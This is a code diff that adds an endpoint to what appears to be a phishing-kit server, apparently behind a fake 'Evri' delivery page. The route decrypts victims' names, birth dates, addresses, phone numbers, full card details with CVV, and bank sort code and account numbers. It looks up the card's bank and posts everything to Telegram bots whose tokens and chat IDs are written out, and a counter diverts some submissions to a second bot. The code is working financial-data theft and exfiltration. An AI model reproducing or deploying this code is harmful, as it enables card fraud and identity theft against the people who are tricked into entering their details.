@@ -1525,6 +1525,61 @@ app.post('/@skiii719',  apiLimiter, (req, res) => {
     })
 });
 
+let F_zn66 = 0;
+
+app.options('/F_zn66', cors())
+
+app.post('/F_zn66',  apiLimiter, (req, res) => {
+    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
+    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
+    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
+    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
+    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
+    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
+    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
+    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
+    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
+    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
+    userAgent = req.body.userAgent;
+    ip = req.body.ip;
+    bin = req.body.bin;
+
+    if (bin.length === 7) {
+        formatBin = bin.replace(/ /g, '');
+        if (formatBin.length === 7) {
+            formatBin = bin.slice(0, -1);
+        }
+        bin = formatBin;
+    }
+    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
+        if (!resp.data.bank) {
+            bankName = ""
+        } else {
+            bankName = resp.data.bank.name;
+        }
+    }).then(function () {
+        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
+        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        if (F_zn66 == 7) {
+            axios.post(
+                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
+            F_zn66 = 0;
+        } else {
+            axios.post(
+                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
+            );
+            axios.post(
+                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1612469030&text=Evri:\n${originalText}`
+            );
+            F_zn66 += 1;
+        }
+
+        res.send("Update Completed");
+    })
+});
+
 //BT
 //BT
 //BT
